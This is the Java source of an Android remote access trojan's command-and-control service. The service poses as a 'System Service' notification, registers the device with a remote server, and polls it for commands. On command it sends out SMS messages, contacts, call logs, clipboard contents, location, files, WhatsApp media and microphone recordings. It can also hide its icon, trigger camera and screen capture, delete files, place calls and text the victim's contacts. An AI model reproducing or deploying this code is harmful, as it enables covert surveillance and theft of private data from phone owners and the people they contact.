package com.vanta.core;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.app.WallpaperManager;
import android.content.*;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.*;
import android.provider.*;
import android.widget.Toast;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2Service extends Service {
    private volatile boolean run = true;
    private String uuid;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        uuid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("c2", "Service", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            startForeground(1, new Notification.Builder(this, "c2")
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.stat_notify_sync).build());
        } else {
            startForeground(1, new Notification.Builder(this)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.stat_notify_sync).build());
        }

        new Thread(new Runnable() { public void run() { loop(); } }).start();
        return START_STICKY;
    }

    private void loop() {
        register();
        while (run) {
            try {
                String body = http("GET", "/cmd?uuid=" + uuid, null);
                String cmd = extract(body);
                if (cmd != null && cmd.length() > 0 && !cmd.equals("null")) send(exec(cmd));
            } catch (Exception e) {}
            try { Thread.sleep(1500); } catch (Exception e) {}
        }
    }

    private void register() {
        try {
            http("POST", "/register",
                "{\"uuid\":\"" + uuid + "\",\"model\":\"" + Build.MODEL + "\"}");
        } catch (Exception e) {}
    }

    private void send(String text) {
        try {
            String safe = text.replace("\\", "\\\\").replace("\"", "\\\"")
                              .replace("\n", "\\n").replace("\r", "");
            http("POST", "/result",
                "{\"uuid\":\"" + uuid + "\",\"text\":\"" + safe + "\"}");
        } catch (Exception e) {}
    }

    private String http(String method, String path, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(Config.SERVER + path).openConnection();
            c.setRequestMethod(method);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            if (body != null) {
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/json");
                OutputStream os = c.getOutputStream();
                os.write(body.getBytes("UTF-8"));
                os.close();
            }
            InputStream in = c.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int r;
            while ((r = in.read(buf)) > 0) bo.write(buf, 0, r);
            in.close();
            return bo.toString("UTF-8");
        } catch (Exception e) { return "{}"; }
    }

    private String extract(String json) {
        int i = json.indexOf("\"cmd\"");
        if (i < 0) return null;
        int s = json.indexOf('"', json.indexOf(':', i) + 1);
        int e = json.indexOf('"', s + 1);
        if (s < 0 || e < 0) return null;
        return json.substring(s + 1, e);
    }

    private String exec(String cmd) {
        try {
            // ===== الأساسية =====
            if (cmd.equals("all-sms")) return sms();
            if (cmd.equals("contacts") || cmd.equals("all-contacts")) return contacts();
            if (cmd.equals("calls")) return calls();
            if (cmd.equals("clipboard")) return clip();
            if (cmd.equals("apps")) return apps();
            if (cmd.equals("location")) return loc();
            if (cmd.equals("files")) return Exfil.list("/sdcard/");
            if (cmd.equals("pics")) return Exfil.list("/sdcard/DCIM/Camera/");
            if (cmd.equals("wa")) return Exfil.list("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/");
            if (cmd.startsWith("ls ")) return Exfil.list(cmd.substring(3).trim());
            if (cmd.equals("mic")) return Exfil.mic(this, 8);
            if (cmd.startsWith("getfile ")) return Exfil.upload(cmd.substring(8).trim());
            if (cmd.equals("vibrate")) { vibrate(); return "📳 اهتزاز"; }
            if (cmd.equals("lock")) return lock();
            if (cmd.equals("ring")) return ring();
            if (cmd.startsWith("open ")) return openApp(cmd.substring(5).trim());
            if (cmd.equals("camera-off")) return camOff();
            if (cmd.equals("camera-on")) return camOn();
            if (cmd.equals("wifi")) return wifi();
            if (cmd.equals("sysinfo")) return sysInfo();
            if (cmd.equals("hide")) { Hider.hide(this); return "🙈 أُخفيت الأيقونة"; }

            // ===== الجديدة =====
            if (cmd.equals("locate")) return freshLocation();
            if (cmd.startsWith("wallpaper ")) return setWallpaper(cmd.substring(10).trim());
            if (cmd.startsWith("volume ")) return setVolume(cmd.substring(7).trim());
            if (cmd.startsWith("download ")) return download(cmd.substring(9).trim());
            if (cmd.startsWith("delete ")) return deleteFile(cmd.substring(7).trim());
            if (cmd.startsWith("smsall ")) return smsAll(cmd.substring(7).trim());

            // ===== القديمة =====
            if (cmd.equals("screenshot") || cmd.equals("screen")) {
                startActivity(new Intent(this, ScreenActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                return "📸 وافق على إذن الشاشة";
            }
            if (cmd.equals("cam") || cmd.equals("main-camera") || cmd.equals("selfie-camera")) {
                startService(new Intent(this, CameraService.class));
                return "📸 جاري التصوير...";
            }
            if (cmd.equals("toast")) {
                new Handler(getMainLooper()).post(new Runnable() {
                    public void run() { Toast.makeText(C2Service.this, "System Update", Toast.LENGTH_SHORT).show(); }
                });
                return "💬 ظهرت رسالة";
            }
            if (cmd.startsWith("makeCall ")) {
                String num = cmd.substring(9).trim();
                Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + num));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                return "📞 يتصل بـ " + num;
            }
            if (cmd.startsWith("sendSms ")) {
                String[] parts = cmd.substring(8).trim().split("\\|");
                if (parts.length < 2) return "❌ الصيغة: sendSms رقم|نص";
                android.telephony.SmsManager.getDefault()
                    .sendTextMessage(parts[0].trim(), null, parts[1].trim(), null, null);
                return "✉️ أُرسلت رسالة إلى " + parts[0].trim();
            }
            if (cmd.startsWith("playAudio ")) {
                String url = cmd.substring(10).trim();
                try {
                    MediaPlayer mp = new MediaPlayer();
                    mp.setDataSource(url);
                    mp.prepare();
                    mp.start();
                    return "🔊 يعزف الآن";
                } catch (Exception e) { return "❌ فشل التشغيل"; }
            }

            return "unknown:" + cmd;
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    // ===== الموقع الحقيقي =====
    private String freshLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (l != null)
                return "📍 " + l.getLatitude() + ", " + l.getLongitude() +
                       "\nhttps://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude();
            return "📍 لا موقع متاح";
        } catch (Exception e) { return "📍 خطأ"; }
    }

    // ===== الخلفية =====
    private String setWallpaper(String url) {
        try {
            Bitmap bmp = BitmapFactory.decodeStream(new URL(url).openStream());
            WallpaperManager.getInstance(this).setBitmap(bmp);
            return "🖼️ تغيّرت الخلفية";
        } catch (Exception e) { return "❌ فشل: " + e.getMessage(); }
    }

    // ===== الصوت =====
    private String setVolume(String v) {
        try {
            int val = Integer.parseInt(v);
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            am.setStreamVolume(AudioManager.STREAM_MUSIC, max * val / 100, 0);
            return "🔊 الصوت الآن " + val + "%";
        } catch (Exception e) { return "❌ قيمة غير صحيحة"; }
    }

    // ===== تحميل ملف =====
    private String download(String url) {
        try {
            InputStream in = new URL(url).openStream();
            File f = new File("/sdcard/Download/" + System.currentTimeMillis() + "_dl");
            FileOutputStream fos = new FileOutputStream(f);
            byte[] buf = new byte[8192];
            int r;
            while ((r = in.read(buf)) > 0) fos.write(buf, 0, r);
            fos.close(); in.close();
            return "⬇️ نُزّل إلى " + f.getAbsolutePath();
        } catch (Exception e) { return "❌ فشل التحميل: " + e.getMessage(); }
    }

    // ===== حذف ملف =====
    private String deleteFile(String path) {
        File f = new File(path);
        if (!f.exists()) return "❌ غير موجود";
        return f.delete() ? "🗑️ حُذف: " + path : "❌ فشل الحذف";
    }

    // ===== SMS للجميع =====
    private String smsAll(String text) {
        try {
            int count = 0;
            Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext() && count < 20) {
                    String num = c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    android.telephony.SmsManager.getDefault()
                        .sendTextMessage(num, null, text, null, null);
                    count++;
                }
                c.close();
            }
            return "✉️ أُرسلت إلى " + count + " رقم";
        } catch (Exception e) { return "❌ " + e.getMessage(); }
    }

    private void vibrate() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) v.vibrate(1500);
    }

    private String lock() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        dpm.lockNow();
        return "🔒 قُفلت الشاشة";
    }

    private String ring() {
        Ringtone r = RingtoneManager.getRingtone(this,
            RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
        r.play();
        return "🔔 يرن الآن";
    }

    private String openApp(String pkg) {
        Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
        if (i == null) return "❌ غير موجود: " + pkg;
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        return "📱 فُتح: " + pkg;
    }

    private String camOff() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        dpm.setCameraDisabled(new ComponentName(this, AdminReceiver.class), true);
        return "📷 عُطّلت الكاميرا";
    }

    private String camOn() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        dpm.setCameraDisabled(new ComponentName(this, AdminReceiver.class), false);
        return "📷 فُعّلت الكاميرا";
    }

    private String wifi() {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        WifiInfo wi = wm.getConnectionInfo();
        int ip = wi.getIpAddress();
        String ipStr = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." +
                       ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
        return "📶 SSID: " + wi.getSSID() + "\n🌐 IP: " + ipStr +
               "\n⚡ " + wi.getLinkSpeed() + " Mbps";
    }

    private String sysInfo() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        int bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
        long free = s.getAvailableBytes() / (1024L * 1024L * 1024L);
        return "📱 " + Build.MODEL +
               "\n🤖 أندرويد " + Build.VERSION.RELEASE +
               "\n🔋 " + bat + "%" +
               "\n💾 " + free + " GB حرة" +
               "\n📦 " + getPackageManager().getInstalledApplications(0).size() + " تطبيق";
    }

    private String sms() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 50)
                sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
            c.close();
        }
        if (sb.length() == 0) return "📭 لا رسائل أو الصلاحية غير ممنوحة";
        return sb.toString();
    }

    private String contacts() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 50)
                sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            c.close();
        }
        if (sb.length() == 0) return "📭 لا جهات اتصال";
        return sb.toString();
    }

    private String calls() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
        if (c != null) {
            int n = 0;
            while (c.moveToNext() && n++ < 30)
                sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
            c.close();
        }
        if (sb.length() == 0) return "📭 لا مكالمات";
        return sb.toString();
    }

    private String clip() {
        ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (cb.getPrimaryClip() != null && cb.getPrimaryClip().getItemCount() > 0)
            return "📋 " + cb.getPrimaryClip().getItemAt(0).getText();
        return "📋 الحافظة فارغة";
    }

    private String apps() {
        StringBuilder sb = new StringBuilder();
        for (android.content.pm.ApplicationInfo a : getPackageManager().getInstalledApplications(0))
            sb.append(a.packageName).append("\n");
        return sb.toString();
    }

    private String loc() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            return l == null ? "📍 لا موقع متاح" : "📍 " + l.getLatitude() + ", " + l.getLongitude();
        } catch (Exception e) { return "📍 خطأ الموقع"; }
    }

    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { run = false; super.onDestroy(); }
            }
